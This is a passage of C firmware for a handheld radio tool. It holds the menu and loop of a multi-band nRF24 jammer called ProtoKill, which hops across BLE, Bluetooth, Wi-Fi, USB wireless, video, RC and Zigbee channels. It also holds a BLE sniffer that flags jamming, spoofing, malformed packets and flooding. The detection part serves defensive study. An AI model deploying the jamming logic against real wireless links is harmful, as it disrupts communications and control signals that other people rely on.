    rf24_power_down(&(ProtoKill_radio2));
    rf24_power_down(&(ProtoKill_radio3));
  }
}

void ProtoKill_updateTFT(void) {
  display_fill_rect(&(tft), 0, 19, 240, 16, DARK_GRAY);

  display_set_text_size(&(tft), 1);

  typedef struct ButtonGuide {
    const char* label;
    const unsigned char* icon;
  } ButtonGuide;
#define ButtonGuide_INITIALIZER {0}
  ;

  ButtonGuide buttons[] = {
      {ProtoKill_jammerActive ? "[ON]" : "[OFF]", bitmap_icon_UP},
      {"MODE-", bitmap_icon_LEFT},
      {"MODE+", bitmap_icon_RIGHT}};

  int xPos = 20;
  int yPosIcon = 19;
  int spacing = 75;

  for (int i = 0; i < 3; i++) {
    display_draw_bitmap(&(tft), xPos, yPosIcon, buttons[i].icon, 16, 16,
                        UI_ICON);

    display_set_text_color_2(&(tft), UI_TEXT, DARK_GRAY);
    display_set_cursor(&(tft), xPos + 18, yPosIcon + 4);
    display_print(&(tft), (TEXT(buttons[i].label)).data);

    if (i < 2) {
      int sepX = xPos + spacing - 8;
      display_draw_fast_v_line(&(tft), sepX, 22, 12, LIGHT_GRAY);
    }

    xPos += spacing;
  }

  display_draw_fast_h_line(&(tft), 0, 19, 240, UI_LINE);
  display_draw_fast_h_line(&(tft), 0, 35, 240, UI_LINE);
}

void ProtoKill_printModeChange(ProtoKill_OperationMode mode) {
  text_t modeText = {.data = "[+] Mode changed to: "};
  switch (mode) {
    case ProtoKill_BLE_MODULE:
      text_append_cstr(&(modeText), "BLE");
      break;
    case ProtoKill_Bluetooth_MODULE:
      text_append_cstr(&(modeText), "Bluetooth");
      break;
    case ProtoKill_WiFi_MODULE:
      text_append_cstr(&(modeText), "WIFI");
      break;
    case ProtoKill_USB_WIRELESS_MODULE:
      text_append_cstr(&(modeText), "USB");
      break;
    case ProtoKill_VIDEO_TX_MODULE:
      text_append_cstr(&(modeText), "Video");
      break;
    case ProtoKill_RC_MODULE:
      text_append_cstr(&(modeText), "RC");
      break;
    case ProtoKill_ZIGBEE_MODULE:
      text_append_cstr(&(modeText), "ZIGBEE");
      break;
    case ProtoKill_NRF24_MODULE:
      text_append_cstr(&(modeText), "NRF24");
      break;
    default:
      text_append_cstr(&(modeText), "Unknown");
      break;
  }
  ProtoKill_Print(modeText, UI_TEXT, false);
}

void ProtoKill_printJammerStatus(bool active) {
  text_t jammerText = {.data = "[!] Jammer "};
  text_append_cstr(&(jammerText),
                   (TEXT(active ? "Activated" : "Deactivated")).data);
  ProtoKill_Print(jammerText, UI_WARN, false);
}

void ProtoKill_checkModeChange(void) {
  ProtoKill_prokillHandleNavButtons();

  if (ProtoKill_modeChangeRequested) {
    ProtoKill_modeChangeRequested = false;
    ProtoKill_currentMode =
        ((ProtoKill_OperationMode)((ProtoKill_currentMode + 1) % 8));
    ProtoKill_initializeRadios();
    ProtoKill_updateTFT();
    ProtoKill_printModeChange(ProtoKill_currentMode);
  }

  if (ProtoKill_modeChangeRequested1) {
    ProtoKill_modeChangeRequested1 = false;
    ProtoKill_currentMode =
        ((ProtoKill_OperationMode)((ProtoKill_currentMode == 0)
                                       ? 7
                                       : (ProtoKill_currentMode - 1)));
    ProtoKill_initializeRadios();
    ProtoKill_updateTFT();
    ProtoKill_printModeChange(ProtoKill_currentMode);
  }

  if (ProtoKill_jammerToggleRequested) {
    ProtoKill_jammerToggleRequested = false;
    ProtoKill_jammerActive = !ProtoKill_jammerActive;
    ProtoKill_initializeRadios();
    ProtoKill_updateTFT();
    ProtoKill_printJammerStatus(ProtoKill_jammerActive);
  }
}

void ProtoKill_prokillSetup(void) {
  setTouchButtonInputEnabled(true);
  bleSetJammerNavLabels();
  bleClearBody(TFT_BLACK);
  ProtoKill_Index = 0;

  float currentBatteryVoltage = readBatteryVoltage();
  drawStatusBar(currentBatteryVoltage, true, false);
  redrawTouchButtonBar();

  ProtoKill_updateTFT();

  ProtoKill_initializeRadios();

#if HAS_PCF8574_BUTTONS
  pcf8574_configure_pin(button_input_device(), BTN_UP, GPIO_MODE_INPUT);
  pcf8574_configure_pin(button_input_device(), BTN_DOWN, GPIO_MODE_INPUT);
  pcf8574_configure_pin(button_input_device(), BTN_LEFT, GPIO_MODE_INPUT);
  pcf8574_configure_pin(button_input_device(), BTN_RIGHT, GPIO_MODE_INPUT);
  pcf8574_configure_pin(button_input_device(), BTN_SELECT, GPIO_MODE_INPUT);
#endif

  ProtoKill_Print(TEXT("[+] System Ready!"), UI_WARN, true);
  redrawTouchButtonBar();
}

void ProtoKill_prokillLoop(void) {
  if (feature_active &&
      (feature_exit_requested || isButtonPressed(BTN_SELECT) ||
       featureExitButtonPressed())) {
    feature_exit_requested = true;
    return;
  }

  maintainTouchNavBar();
  display_draw_fast_h_line(&(tft), 0, 19, 240, UI_LINE);

  ProtoKill_checkModeChange();

  if (ProtoKill_jammerActive) {
    if (ProtoKill_currentMode == ProtoKill_BLE_MODULE) {
      int randomIndex = bleRandInt_1((int)(sizeof(ProtoKill_ble_channels) /
                                           sizeof(ProtoKill_ble_channels[0])));
      int channel = ProtoKill_ble_channels[randomIndex];
      rf24_set_channel(&(ProtoKill_radio1), channel);
      rf24_set_channel(&(ProtoKill_radio2), channel);
      rf24_set_channel(&(ProtoKill_radio3), channel);

    } else if (ProtoKill_currentMode == ProtoKill_Bluetooth_MODULE) {
      int randomIndex =
          bleRandInt_1((int)(sizeof(ProtoKill_bluetooth_channels) /
                             sizeof(ProtoKill_bluetooth_channels[0])));
      int channel = ProtoKill_bluetooth_channels[randomIndex];
      rf24_set_channel(&(ProtoKill_radio1), channel);
      rf24_set_channel(&(ProtoKill_radio2), channel);
      rf24_set_channel(&(ProtoKill_radio3), channel);

    } else if (ProtoKill_currentMode == ProtoKill_WiFi_MODULE) {
      int randomIndex = bleRandInt_1((int)(sizeof(ProtoKill_WiFi_channels) /
                                           sizeof(ProtoKill_WiFi_channels[0])));
      int channel = ProtoKill_WiFi_channels[randomIndex];
      rf24_set_channel(&(ProtoKill_radio1), channel);
      rf24_set_channel(&(ProtoKill_radio2), channel);
      rf24_set_channel(&(ProtoKill_radio3), channel);

    } else if (ProtoKill_currentMode == ProtoKill_USB_WIRELESS_MODULE) {
      int randomIndex =
          bleRandInt_1((int)(sizeof(ProtoKill_usbWireless_channels) /
                             sizeof(ProtoKill_usbWireless_channels[0])));
      int channel = ProtoKill_usbWireless_channels[randomIndex];
      rf24_set_channel(&(ProtoKill_radio1), channel);
      rf24_set_channel(&(ProtoKill_radio2), channel);
      rf24_set_channel(&(ProtoKill_radio3), channel);

    } else if (ProtoKill_currentMode == ProtoKill_VIDEO_TX_MODULE) {
      int randomIndex =
          bleRandInt_1((int)(sizeof(ProtoKill_videoTransmitter_channels) /
                             sizeof(ProtoKill_videoTransmitter_channels[0])));
      int channel = ProtoKill_videoTransmitter_channels[randomIndex];
      rf24_set_channel(&(ProtoKill_radio1), channel);
      rf24_set_channel(&(ProtoKill_radio2), channel);
      rf24_set_channel(&(ProtoKill_radio3), channel);

    } else if (ProtoKill_currentMode == ProtoKill_RC_MODULE) {
      int randomIndex = bleRandInt_1((int)(sizeof(ProtoKill_rc_channels) /
                                           sizeof(ProtoKill_rc_channels[0])));
      int channel = ProtoKill_rc_channels[randomIndex];
      rf24_set_channel(&(ProtoKill_radio1), channel);
      rf24_set_channel(&(ProtoKill_radio2), channel);
      rf24_set_channel(&(ProtoKill_radio3), channel);

    } else if (ProtoKill_currentMode == ProtoKill_ZIGBEE_MODULE) {
      int randomIndex =
          bleRandInt_1((int)(sizeof(ProtoKill_zigbee_channels) /
                             sizeof(ProtoKill_zigbee_channels[0])));
      int channel = ProtoKill_zigbee_channels[randomIndex];
      rf24_set_channel(&(ProtoKill_radio1), channel);
      rf24_set_channel(&(ProtoKill_radio2), channel);
      rf24_set_channel(&(ProtoKill_radio3), channel);

    } else if (ProtoKill_currentMode == ProtoKill_NRF24_MODULE) {
      int randomIndex =
          bleRandInt_1((int)(sizeof(ProtoKill_nrf24_channels) /
                             sizeof(ProtoKill_nrf24_channels[0])));
      int channel = ProtoKill_nrf24_channels[randomIndex];
      rf24_set_channel(&(ProtoKill_radio1), channel);
      rf24_set_channel(&(ProtoKill_radio2), channel);
      rf24_set_channel(&(ProtoKill_radio3), channel);
    }
  }
}

#define SCREEN_WIDTH TFT_WIDTH
#define SCREENHEIGHT TFT_HEIGHT
#undef STATUS_BAR_Y_OFFSET
#define STATUS_BAR_Y_OFFSET 20
#define STATUS_BAR_HEIGHT 16
#define ICON_SIZE 16
#undef ICON_NUM
#define ICON_NUM 3

static bool BleSniffer_uiDrawn = false;

static int BleSniffer_iconX[ICON_NUM] = {170, 210, 10};
static const unsigned char* BleSniffer_icons[ICON_NUM] = {
    bitmap_icon_undo, bitmap_icon_eye2, bitmap_icon_go_back};

#define HEADER_HEIGHT 20
#define STATUS_DOT_SIZE 8
#undef LINE_HEIGHT
#define LINE_HEIGHT 16
#undef MAX_LINES
#define MAX_LINES 16
#define MAX_DEVICES 32
#define SCAN_INTERVAL 5000
#define MAX_LINE_LENGTH 38
#define BEACON_PREFIX "4c000215"
#define ALERT_FLASH_DURATION 1000
#define SEPARATOR_THICKNESS 1
#define SEPARATOR_MARGIN 5
#define Y_OFFSET 37

enum { BleSniffer_Config_tftRotation = 0 };
enum { BleSniffer_Config_serialBaud = 115200 };
enum { BleSniffer_Config_bleScanDuration = 5 };
enum { BleSniffer_Config_btScanDuration = 5 };
enum { BleSniffer_Config_maxPacketCount = 20 };
enum { BleSniffer_Config_minRssiThreshold = -20 };
enum { BleSniffer_Config_maxNewDevices = 20 };
enum { BleSniffer_Config_maxMfgDataLength = 31 };
enum { BleSniffer_Config_deviceTimeout = 30000 };
enum { BleSniffer_Config_maxRandomizedMacChanges = 5 };

typedef enum BleSniffer_MessageType {
  BleSniffer_MessageType_DEVICE,
  BleSniffer_MessageType_ALERT,
  BleSniffer_MessageType_STATUS
} BleSniffer_MessageType;

typedef struct BleSniffer_DeviceInfo {
  text_t mac;
  int rssi;
  int packetCount;
  bool isSuspicious;
  text_t deviceName;
  text_t serviceUUID;
  text_t beaconUUID;
  unsigned long lastSeen;
  bool display;
  bool jammingAlerted;
  bool isBLE;
  int macChangeCount;
} BleSniffer_DeviceInfo;
#define BleSniffer_DeviceInfo_INITIALIZER \
  {.rssi = 0,                             \
   .packetCount = 0,                      \
   .isSuspicious = false,                 \
   .lastSeen = 0,                         \
   .display = true,                       \
   .jammingAlerted = false,               \
   .isBLE = true,                         \
   .macChangeCount = 0}
;

typedef struct BleSniffer_DisplayLine {
  text_t text;
  uint16_t color;
  uint16_t originalColor;
  bool isAlert;
  unsigned long flashUntil;
  BleSniffer_MessageType type;
} BleSniffer_DisplayLine;
#define BleSniffer_DisplayLine_INITIALIZER \
  {.color = GREEN,                         \
   .originalColor = GREEN,                 \
   .isAlert = false,                       \
   .flashUntil = 0,                        \
   .type = BleSniffer_MessageType_DEVICE}
;

typedef struct ble_sniffer_advertisement_t {
  char mac[18];
  char name[64];
  char service[40];
  uint8_t manufacturer[128];
  uint16_t manufacturerSize;
  int rssi;
  uint32_t timestamp;
} ble_sniffer_advertisement_t;
#define ble_sniffer_advertisement_t_INITIALIZER \
  {.mac = {0},                                  \
   .name = {0},                                 \
   .service = {0},                              \
   .manufacturer = {0},                         \
   .manufacturerSize = 0,                       \
   .rssi = 0,                                   \
   .timestamp = 0}
;
static QueueHandle_t ble_sniffer_advertisements = NULL;
static BleSniffer_DeviceInfo* ble_sniffer_devices = NULL;
static BleSniffer_DisplayLine* ble_sniffer_displayLines = NULL;
static int ble_sniffer_deviceCount = 0;
static int ble_sniffer_lineNumber = 1;
static int ble_sniffer_suspiciousCount = 0;
static int ble_sniffer_newDevicesThisScan = 0;
static int ble_sniffer_lastDeviceCount = -1;
static int ble_sniffer_lastSuspiciousCount = -1;
static _Atomic(bool) ble_sniffer_scanning = {false};
static bool ble_sniffer_isBLEScanActive = true;
static unsigned long ble_sniffer_lastScanTime = 0;
static unsigned long ble_sniffer_lastFlashToggle = 0;
static bool ble_sniffer_flashState = false;
static ble_scan_t* ble_sniffer_pBLEScan = NULL;
static void ble_sniffer_on_result(const ble_device_t* device, void* context);
static void ble_sniffer_releaseBleCallbacks(void);
static int ble_sniffer_snifferContentTop(void);
static int ble_sniffer_snifferVisibleLines(void);
static bool ble_sniffer_snifferLineFits(int lineIndex);
static void ble_sniffer_initDisplay(void);
static void ble_sniffer_updateHeader(void);
static void ble_sniffer_updateDisplay(void);
static void ble_sniffer_addLine(text_t text, uint16_t color, bool isAlert,
                                BleSniffer_MessageType type);
static void ble_sniffer_checkSuspiciousActivity(int idx,
                                                unsigned long timestamp);
static bool ble_sniffer_isRandomizedMac(text_t mac);
static void ble_sniffer_processNewDevice(
    const ble_sniffer_advertisement_t* advertisement);
static void ble_sniffer_checkBeaconSpoofing(BleSniffer_DeviceInfo* device,
                                            text_t mfgData,
                                            unsigned long timestamp);
static void ble_sniffer_checkMalformedPacket(BleSniffer_DeviceInfo* device,
                                             text_t mfgData,
                                             unsigned long timestamp);
static void ble_sniffer_checkMacSpoofing(BleSniffer_DeviceInfo* device,
                                         unsigned long timestamp);
static void ble_sniffer_cleanupDevices(unsigned long timestamp);
static void ble_sniffer_filterByMac(text_t filterMac);
static void ble_sniffer_filterSuspicious(void);
static void ble_sniffer_refreshDisplay(void);
static void ble_sniffer_runUI(void);
static void ble_sniffer_setup(void);
static void ble_sniffer_loop(void);
static void ble_sniffer_startBLEScan(void);
static void ble_sniffer_stop(void);
static void ble_sniffer_releaseBleCallbacks(void) {
  if (ble_sniffer_pBLEScan) {
    ble_scan_stop(ble_sniffer_pBLEScan);
    ble_scan_set_callback(ble_sniffer_pBLEScan, NULL, NULL);
  }
  // The callback and queue live with this object; late host events are safe.
}
static int ble_sniffer_snifferContentTop(void) {
  return Y_OFFSET + HEADER_HEIGHT;
}
static int ble_sniffer_snifferVisibleLines(void) {
  return bleMaxLinesInZone(ble_sniffer_snifferContentTop(), LINE_HEIGHT);
}
static bool ble_sniffer_snifferLineFits(int lineIndex) {
  const int y = ble_sniffer_snifferContentTop() + (lineIndex * LINE_HEIGHT);
  return y + LINE_HEIGHT <= bleContentBottom();
}
static void ble_sniffer_initDisplay(void) {
  BleSniffer_uiDrawn = false;

  float currentBatteryVoltage = readBatteryVoltage();
  drawStatusBar(currentBatteryVoltage, true, false);
  ble_sniffer_runUI();

  setupTouchscreen();
  {
    const int bodyH = bleContentBottom() - 37;
    if (bodyH > 0) {
      display_fill_rect(&(tft), 0, 37, 240, bodyH, TFT_BLACK);
    }
  }
  display_set_text_size(&(tft), 1);
  ble_sniffer_updateHeader();
}
static void ble_sniffer_updateHeader(void) {
  if (!ble_sniffer_scanning) return;
  display_fill_rect(&(tft), 0, Y_OFFSET, display_width(&(tft)), HEADER_HEIGHT,
                    DARK_GRAY);
  display_set_text_color_2(&(tft), WHITE, DARK_GRAY);
  display_set_cursor(&(tft), 5, Y_OFFSET + 6);
  text_t status =
      TEXT(ble_sniffer_isBLEScanActive ? "BLE Scanning" : "BT Scanning");
  char line[96];
  snprintf(line, sizeof(line), "%.12s | Dev: %d Sus: %d", (status).data,
           ble_sniffer_deviceCount, ble_sniffer_suspiciousCount);
  display_print(&(tft), (TEXT(line)).data);
  uint16_t dotColor = ble_sniffer_isBLEScanActive ? BLUE : GREEN;
  display_fill_circle(&(tft), display_width(&(tft)) - 10, 46,
                      STATUS_DOT_SIZE / 2, dotColor);
  display_draw_fast_h_line(&(tft), 0, 56, 240, UI_LINE);
}
static void ble_sniffer_updateDisplay(void) {
  if (!ble_sniffer_scanning) return;
  unsigned long now = sys_monotonic_ms();
  if (now - ble_sniffer_lastFlashToggle >= 500) {
    ble_sniffer_flashState = !ble_sniffer_flashState;
    ble_sniffer_lastFlashToggle = now;
  }
  {
    const int bodyTop = Y_OFFSET + HEADER_HEIGHT;
    const int bodyH = bleContentBottom() - bodyTop;
    if (bodyH > 0) {
      display_fill_rect(&(tft), 0, bodyTop, display_width(&(tft)), bodyH,
                        TFT_BLACK);
    }
  }
  const int visibleLines = ble_sniffer_snifferVisibleLines();
  for (int i = 0; i < visibleLines; i++) {
    if ((strlen((ble_sniffer_displayLines[i].text).data) == 0)) continue;
    if (!ble_sniffer_snifferLineFits(i)) continue;
    int y = ble_sniffer_snifferContentTop() + (i * LINE_HEIGHT);
    uint16_t textColor = ble_sniffer_displayLines[i].originalColor;
    if (ble_sniffer_displayLines[i].isAlert &&
        ble_sniffer_displayLines[i].flashUntil > now) {
      textColor = ble_sniffer_flashState
                      ? ble_sniffer_displayLines[i].originalColor
                      : TFT_BLACK;
    }
    display_set_text_color_2(&(tft), textColor, TFT_BLACK);
    display_set_cursor(&(tft), 5, y + 2);
    display_print(&(tft), (ble_sniffer_displayLines[i].text).data);
    if (ble_sniffer_displayLines[i].originalColor == ORANGE &&
        !ble_sniffer_displayLines[i].isAlert) {
      display_draw_rect(&(tft), 3, y, display_width(&(tft)) - 6,
                        LINE_HEIGHT - 2, ORANGE);
    }
    if (i < visibleLines - 1 &&
        !(strlen((ble_sniffer_displayLines[i + 1].text).data) == 0) &&
        ble_sniffer_displayLines[i].type !=
            ble_sniffer_displayLines[i + 1].type &&
        ble_sniffer_snifferLineFits(i + 1)) {
      int separatorY = y + LINE_HEIGHT - 1;
      display_draw_fast_h_line(&(tft), SEPARATOR_MARGIN, separatorY,
                               display_width(&(tft)) - 2 * SEPARATOR_MARGIN,
                               DARK_GRAY);
    }
  }
  if (ble_sniffer_deviceCount != ble_sniffer_lastDeviceCount ||
      ble_sniffer_suspiciousCount != ble_sniffer_lastSuspiciousCount) {
    ble_sniffer_updateHeader();
    ble_sniffer_lastDeviceCount = ble_sniffer_deviceCount;
    ble_sniffer_lastSuspiciousCount = ble_sniffer_suspiciousCount;
  }
  if (ble_sniffer_deviceCount == 0 && ble_sniffer_lineNumber == 1) {
    display_set_text_color_2(&(tft), GREEN, TFT_BLACK);
    display_set_cursor(&(tft), 5, ble_sniffer_snifferContentTop() + 10);
  }
}
static void ble_sniffer_addLine(text_t text, uint16_t color, bool isAlert,
                                BleSniffer_MessageType type) {
  if (!ble_sniffer_scanning) return;
  if (strlen((text).data) > MAX_LINE_LENGTH) {
    text =
        text_join_cstr((text_slice(text, 0, MAX_LINE_LENGTH - 3)).data, "...");
  }
  const int visibleLines = ble_sniffer_snifferVisibleLines();
  for (int i = visibleLines - 1; i > 0; i--) {
    ble_sniffer_displayLines[i] = ble_sniffer_displayLines[i - 1];
  }
  for (int i = visibleLines; i < MAX_LINES; i++) {
    ble_sniffer_displayLines[i].text = TEXT("");
  }
  ble_sniffer_displayLines[0].text = text;
  ble_sniffer_displayLines[0].color = color;
  ble_sniffer_displayLines[0].originalColor =
      (type == BleSniffer_MessageType_STATUS) ? UI_DIM_TEXT : color;
  ble_sniffer_displayLines[0].isAlert = isAlert;
  ble_sniffer_displayLines[0].flashUntil =
      isAlert ? sys_monotonic_ms() + ALERT_FLASH_DURATION : 0;
  ble_sniffer_displayLines[0].type = type;
  ble_sniffer_updateDisplay();
}
static void ble_sniffer_checkSuspiciousActivity(int idx,
                                                unsigned long timestamp) {
  __auto_type device = &(ble_sniffer_devices[idx]);
  if ((*device).packetCount > BleSniffer_Config_maxPacketCount ||
      ((*device).isBLE &&
       (*device).rssi > BleSniffer_Config_minRssiThreshold)) {
    if (!(*device).isSuspicious) {
      (*device).isSuspicious = true;
      ble_sniffer_suspiciousCount++;
      if ((*device).display && !(*device).jammingAlerted) {
        const char* protocol = (*device).isBLE ? "BLE" : "BT";
        char line[160];
        snprintf(line, sizeof(line),
                 "%d -> Jamming Suspected (%.3s): %.17s T:%lu",
                 ble_sniffer_lineNumber++, protocol, ((*device).mac).data,
                 (unsigned long)timestamp);
        ble_sniffer_addLine(TEXT(line), ORANGE, true,
                            BleSniffer_MessageType_ALERT);
        (*device).jammingAlerted = true;
      }
    }
  }
  if ((*device).isBLE && ble_sniffer_isRandomizedMac((*device).mac) &&
      (*device).macChangeCount > BleSniffer_Config_maxRandomizedMacChanges) {
    (*device).isSuspicious = true;
    ble_sniffer_suspiciousCount++;
    if ((*device).display) {
      char line[160];
      snprintf(line, sizeof(line),
               "%d -> MAC Spoofing Suspected (BLE): %.17s T:%lu",
               ble_sniffer_lineNumber++, ((*device).mac).data,
               (unsigned long)timestamp);
      ble_sniffer_addLine(TEXT(line), ORANGE, true,
                          BleSniffer_MessageType_ALERT);
    }
  }
}
static bool ble_sniffer_isRandomizedMac(text_t mac) {
  text_t firstByte = text_slice(mac, 0, 2);
  char* end;
  long value = strtol((firstByte).data, &end, 16);
  return (value & 0xC0) == 0xC0;
}
static void ble_sniffer_processNewDevice(
    const ble_sniffer_advertisement_t* advertisement) {
  const unsigned long timestamp = (*advertisement).timestamp;
  const bool isBLE = true;
  if (ble_sniffer_deviceCount >= MAX_DEVICES) return;
  ble_sniffer_newDevicesThisScan++;
  __auto_type device = &(ble_sniffer_devices[ble_sniffer_deviceCount]);
  (*device) = ((BleSniffer_DeviceInfo)BleSniffer_DeviceInfo_INITIALIZER);
  (*device).isBLE = true;
  (*device).mac = TEXT((*advertisement).mac);
  (*device).rssi = (*advertisement).rssi;
  (*device).deviceName = TEXT((*advertisement).name);
  (*device).serviceUUID = TEXT((*advertisement).service);
  text_t mfgData = text_bytes((const char*)(*advertisement).manufacturer,
                              (*advertisement).manufacturerSize);
  ble_sniffer_checkBeaconSpoofing(&((*device)), TEXT(mfgData), timestamp);
  ble_sniffer_checkMalformedPacket(&((*device)), TEXT(mfgData), timestamp);
  (*device).packetCount = 1;
  (*device).lastSeen = timestamp;
  (*device).display = true;
  ble_sniffer_checkMacSpoofing(&((*device)), timestamp);
  ble_sniffer_checkSuspiciousActivity(ble_sniffer_deviceCount, timestamp);
  if ((*device).display) {
    const char* protocol = isBLE ? "BLE" : "BT";
    char line[220];
    snprintf(line, sizeof(line), "%d -> %.17s (%d dBm, %.3s)",
             ble_sniffer_lineNumber++, ((*device).mac).data, (*device).rssi,
             protocol);
    text_t out = TEXT(line);
    if (isBLE && !(strlen(((*device).deviceName).data) == 0)) {
      text_append_cstr(&(out), " N:");
      text_append_cstr(&(out), (text_slice((*device).deviceName, 0, 6)).data);
    }
    if (isBLE && !(strlen(((*device).serviceUUID).data) == 0)) {
      text_append_cstr(&(out), " U:");
      text_append_cstr(&(out), (text_slice((*device).serviceUUID, 0, 8)).data);
    }
    text_append_cstr(&(out), " T:");
    text_append_cstr(&(out), (text_slice(TEXT(timestamp), 0, 6)).data);
    ble_sniffer_addLine(out, (*device).isSuspicious ? ORANGE : GREEN, false,
                        BleSniffer_MessageType_DEVICE);
  }
  ble_sniffer_deviceCount++;
  if (ble_sniffer_newDevicesThisScan > BleSniffer_Config_maxNewDevices &&
      (*device).display) {
    char line[120];
    snprintf(line, sizeof(line), "%d -> Flooding Detected (%s) T:%lu",
             ble_sniffer_lineNumber++, isBLE ? "BLE" : "BT",
             (unsigned long)timestamp);
    ble_sniffer_addLine(TEXT(line), ORANGE, true, BleSniffer_MessageType_ALERT);
  }
}
static void ble_sniffer_checkBeaconSpoofing(BleSniffer_DeviceInfo* device,
                                            text_t mfgData,
                                            unsigned long timestamp) {
  if (!(*device).isBLE ||
      !text_prefix_cstr((mfgData).data, (TEXT(BEACON_PREFIX)).data))
    return;
  (*device).beaconUUID = text_slice(mfgData, 4, 36);
  for (int i = 0; i < ble_sniffer_deviceCount; i++) {
    if ((strcmp((ble_sniffer_devices[i].beaconUUID).data,
                ((*device).beaconUUID).data) == 0) &&
        !(strcmp((ble_sniffer_devices[i].mac).data, ((*device).mac).data) ==
          0)) {
      ble_sniffer_devices[i].isSuspicious = true;
      (*device).isSuspicious = true;
      ble_sniffer_suspiciousCount++;
      if ((*device).display) {
        char line[160];
        snprintf(line, sizeof(line), "%d -> Beacon Spoofing (BLE): %.17s T:%lu",
                 ble_sniffer_lineNumber++, ((*device).mac).data,
                 (unsigned long)timestamp);
        ble_sniffer_addLine(TEXT(line), ORANGE, true,
                            BleSniffer_MessageType_ALERT);
      }
    }
  }
}
static void ble_sniffer_checkMalformedPacket(BleSniffer_DeviceInfo* device,
                                             text_t mfgData,
                                             unsigned long timestamp) {
  if (!(*device).isBLE ||
      strlen((mfgData).data) <= BleSniffer_Config_maxMfgDataLength)
    return;
  (*device).isSuspicious = true;
  ble_sniffer_suspiciousCount++;
  if ((*device).display) {
    char line[160];
    snprintf(line, sizeof(line), "%d -> Malformed Packet (BLE): %.17s T:%lu",
             ble_sniffer_lineNumber++, ((*device).mac).data,
             (unsigned long)timestamp);
    ble_sniffer_addLine(TEXT(line), ORANGE, true, BleSniffer_MessageType_ALERT);
  }
}
static void ble_sniffer_checkMacSpoofing(BleSniffer_DeviceInfo* device,
                                         unsigned long timestamp) {
  for (int i = 0; i < ble_sniffer_deviceCount; i++) {
    if ((strcmp((ble_sniffer_devices[i].mac).data, ((*device).mac).data) ==
         0) &&
        i != ble_sniffer_deviceCount) {
      ble_sniffer_devices[i].isSuspicious = true;
      (*device).isSuspicious = true;
      ble_sniffer_suspiciousCount++;
      if ((*device).display) {
        text_t protocol = TEXT((*device).isBLE ? "BLE" : "BT");
        char line[160];
        snprintf(line, sizeof(line),
                 "%d -> Possible Spoofing (%.3s): %.17s T:%lu",
                 ble_sniffer_lineNumber++, (protocol).data,
                 ((*device).mac).data, (unsigned long)timestamp);
        ble_sniffer_addLine(TEXT(line), ORANGE, true,
                            BleSniffer_MessageType_ALERT);
      }
    }
  }
}
static void ble_sniffer_cleanupDevices(unsigned long timestamp) {
  for (int i = 0; i < ble_sniffer_deviceCount;) {
    if (timestamp - ble_sniffer_devices[i].lastSeen >
        BleSniffer_Config_deviceTimeout) {
      if (ble_sniffer_devices[i].isSuspicious) ble_sniffer_suspiciousCount--;
      for (int j = i; j < ble_sniffer_deviceCount - 1; j++) {
        ble_sniffer_devices[j] = ble_sniffer_devices[j + 1];
      }
      ble_sniffer_deviceCount--;
    } else {
      i++;
    }
  }
}
static void ble_sniffer_filterByMac(text_t filterMac) {
  for (int i = 0; i < ble_sniffer_deviceCount; i++) {
    ble_sniffer_devices[i].display =
        ((strcmp((ble_sniffer_devices[i].mac).data, (filterMac).data) == 0));
  }
  ble_sniffer_refreshDisplay();
}
static void ble_sniffer_filterSuspicious(void) {
  for (int i = 0; i < ble_sniffer_deviceCount; i++) {
    ble_sniffer_devices[i].display = ble_sniffer_devices[i].isSuspicious;
  }
  ble_sniffer_refreshDisplay();
}
static void ble_sniffer_refreshDisplay(void) {
  for (int i = 0; i < MAX_LINES; i++) {
    ble_sniffer_displayLines[i].text = TEXT("");
    ble_sniffer_displayLines[i].color = GREEN;
    ble_sniffer_displayLines[i].originalColor = GREEN;
    ble_sniffer_displayLines[i].isAlert = false;
    ble_sniffer_displayLines[i].flashUntil = 0;
    ble_sniffer_displayLines[i].type = BleSniffer_MessageType_DEVICE;
  }
  ble_sniffer_lineNumber = 1;
  {
    const int bodyTop = Y_OFFSET + HEADER_HEIGHT;
    const int bodyH = bleContentBottom() - bodyTop;
    if (bodyH > 0) {
      display_fill_rect(&(tft), 0, bodyTop, display_width(&(tft)), bodyH,
                        TFT_BLACK);
    }
  }
  for (int i = 0; i < ble_sniffer_deviceCount; i++) {
    if (ble_sniffer_devices[i].display) {
      const char* protocol = ble_sniffer_devices[i].isBLE ? "BLE" : "BT";
      char line[220];
      snprintf(line, sizeof(line), "%d -> %.17s (%d dBm, %.3s)",
               ble_sniffer_lineNumber++, (ble_sniffer_devices[i].mac).data,
               ble_sniffer_devices[i].rssi, protocol);
      text_t out = TEXT(line);
      if (ble_sniffer_devices[i].isBLE &&
          !(strlen((ble_sniffer_devices[i].deviceName).data) == 0))
        text_append_cstr(
            &(out),
            (text_join_cstr(
                 " N:",
                 (text_slice(ble_sniffer_devices[i].deviceName, 0, 6)).data))
                .data);
      if (ble_sniffer_devices[i].isBLE &&
          !(strlen((ble_sniffer_devices[i].serviceUUID).data) == 0))
        text_append_cstr(
            &(out),
            (text_join_cstr(
                 " U:",
                 (text_slice(ble_sniffer_devices[i].serviceUUID, 0, 8)).data))
                .data);
      text_append_cstr(&(out), " T:");
      text_append_cstr(
          &(out),
          (text_slice(TEXT(ble_sniffer_devices[i].lastSeen), 0, 6)).data);
      ble_sniffer_addLine(out,
                          ble_sniffer_devices[i].isSuspicious ? ORANGE : GREEN,
                          false, BleSniffer_MessageType_DEVICE);
    }
  }
}
static void ble_sniffer_runUI(void) {
  static int iconY = STATUS_BAR_Y_OFFSET;

  if (!BleSniffer_uiDrawn) {
    display_draw_fast_h_line(&(tft), 0, 19, 240, UI_LINE);
    display_draw_fast_h_line(&(tft), 0, 36, 240, UI_LINE);
    display_fill_rect(&(tft), 0, STATUS_BAR_Y_OFFSET, SCREEN_WIDTH,
                      STATUS_BAR_HEIGHT, DARK_GRAY);

    for (int i = 0; i < ICON_NUM; i++) {
      if (BleSniffer_icons[i] != NULL) {
        display_draw_bitmap(&(tft), BleSniffer_iconX[i], iconY,
                            BleSniffer_icons[i], ICON_SIZE, ICON_SIZE,
                            TFT_WHITE);
      }
    }
    display_draw_fast_h_line(&(tft), 0, STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT,
                             SCREEN_WIDTH, UI_LINE);
    BleSniffer_uiDrawn = true;
  }

  static unsigned long lastAnimationTime = 0;
  static int animationState = 0;
  static int activeIcon = -1;

  if (animationState > 0 && sys_monotonic_ms() - lastAnimationTime >= 150) {
    if (animationState == 1) {
      display_draw_bitmap(&(tft), BleSniffer_iconX[activeIcon], iconY,
                          BleSniffer_icons[activeIcon], ICON_SIZE, ICON_SIZE,
                          TFT_WHITE);
      animationState = 2;

